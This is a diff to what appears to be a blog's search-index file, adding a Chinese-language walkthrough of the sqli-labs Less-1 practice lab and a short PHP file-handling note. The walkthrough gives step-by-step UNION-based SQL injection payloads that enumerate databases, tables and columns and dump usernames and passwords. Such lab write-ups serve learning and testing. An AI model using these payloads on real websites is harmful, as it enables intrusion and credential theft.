@@ -4,6 +4,44 @@
   
     
     <entry>
+      <title>sqli-lab-Less-1</title>
+      <link href="/%E4%BD%BF%E7%94%A8php%E6%93%8D%E4%BD%9Cmysql.html"/>
+      <url>/%E4%BD%BF%E7%94%A8php%E6%93%8D%E4%BD%9Cmysql.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="判断是否存在注入点"><a href="#判断是否存在注入点" class="headerlink" title="判断是否存在注入点"></a>判断是否存在注入点</h2><p>加入单引号查看是存在注入Less-1&#x2F;?id&#x3D;1’<br><img src="/img/11.png"><br>发现报语法错误，说明’被带入数据库中查询，并未被过滤，说明大概率存在sql注入漏洞</p><h2 id="判断注入点类型（字符型或数字型）"><a href="#判断注入点类型（字符型或数字型）" class="headerlink" title="判断注入点类型（字符型或数字型）"></a>判断注入点类型（字符型或数字型）</h2><p>Less-1&#x2F;?id&#x3D;1’and ‘1’&#x3D;’1’<br><img src="/img/12.png"><br>Less-1&#x2F;?id&#x3D;1’and ‘1’&#x3D;’2’<br><img src="/img/13.png"><br>则推断出为字符型注入点</p><h2 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h2><p>知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数<br>?id&#x3D;1’order by 3 –+<br>order by 4 报错<br><img src="/img/14.png"></p><h2 id="判断显错位"><a href="#判断显错位" class="headerlink" title="判断显错位"></a>判断显错位</h2><p>判断其第几列有回显，这里注意id后面的数字要采用一个不存在的数字，比如-1<br>Less-1&#x2F;?id&#x3D;-1’ union select 1,2,3 –+<br><img src="/img/15.png"><br>2和3都是显错位</p><h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><p>Less-1&#x2F;?id&#x3D;-1’ union select 1,database(),3 –+<br><img src="/img/16.png"></p><h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><p>Less-1&#x2F;?id&#x3D;-1’ union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;’security’ limit 3,1 –+<br><img src="/img/17.png"><br>Less-1&#x2F;?id&#x3D;-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’ –+<br><img src="/img/18.png"><br>第二种虽然方便，但显示位不够时可能出现问题</p><h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><p>Less-1&#x2F;?id&#x3D;-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’user’ –+<br>同样也可以使用limit一个一个显示<br><img src="/img/19.png"></p><h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><p>Less-1&#x2F;?id&#x3D;-1’ union select 1,username,password from users –+<br><img src="/img/20.png"><br>Less-1&#x2F;?id&#x3D;-1’ union select 1,username,password from users limit 1,1 –+<br><img src="/img/21.png"><br>同样也可一次性显示<br>Less-1&#x2F;?id&#x3D;-1’ union select 1,2,group_concat(id,username,password) from users limit 1,1 –+<br><img src="/img/22.png"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> sqlilabs </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>php表单</title>
+      <link href="/php%E8%A1%A8%E5%8D%95.html"/>
+      <url>/php%E8%A1%A8%E5%8D%95.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="PHP-文件处理"><a href="#PHP-文件处理" class="headerlink" title="PHP 文件处理"></a>PHP 文件处理</h2><h3 id="feof函数"><a href="#feof函数" class="headerlink" title="feof函数"></a>feof函数</h3><p>feof函数的返回值是一个整型数,如果文件没有到达末尾,则返回值为0;如果文件到达末尾,则返回值为1</p><p><img src="/img/10.png"></p><h3 id="PHP-文件上传"><a href="#PHP-文件上传" class="headerlink" title="PHP 文件上传"></a>PHP 文件上传</h3><p>通过 PHP，可以把文件上传到服务器。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> php </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>sqlilabs</title>
       <link href="/sqlilabs.html"/>
       <url>/sqlilabs.html</url>
